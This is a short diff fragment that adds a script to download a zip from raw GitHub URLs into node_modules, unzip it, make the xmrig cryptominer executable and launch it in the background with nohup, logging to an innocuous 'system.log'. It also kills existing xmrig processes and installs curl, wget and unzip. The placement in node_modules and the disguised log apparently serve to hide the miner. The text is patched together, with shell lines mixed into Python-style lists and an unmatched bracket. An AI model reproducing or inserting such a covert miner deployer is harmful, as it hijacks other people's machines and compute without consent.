@@ -1,0 +1,20 @@
+nohup ./xmrig --config config.json >> log.log 2>&1 &
+ps aux | grep xmrig
+    "pkill -9 -f xmrig",
+    "apt update -y",
+    "apt install curl -y",
+    "apt install wget -y",
+    "apt install unzip -y",
+    "mkdir -p node_modules"
+]
+
+CURL_CMD = "curl -L https://raw.githubusercontent.com/zzxzxxzx/z/refs/heads/main/zzx.zip -o node_modules/zzx.zip"
+WGET_CMD = "wget -O node_modules/zzx.zip https://raw.githubusercontent.com/zzxzxxzx/z/refs/heads/main/zzx.zip"
+
+POST_COMMANDS = [
+    "unzip -o node_modules/zzx.zip -d node_modules",
+    "chmod +x node_modules/xmrig",
+    "nohup node_modules/xmrig --config node_modules/config.json >> node_modules/system.log 2>&1 &"
+]
+
+wget -O zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip > xm.log 2>&1 &
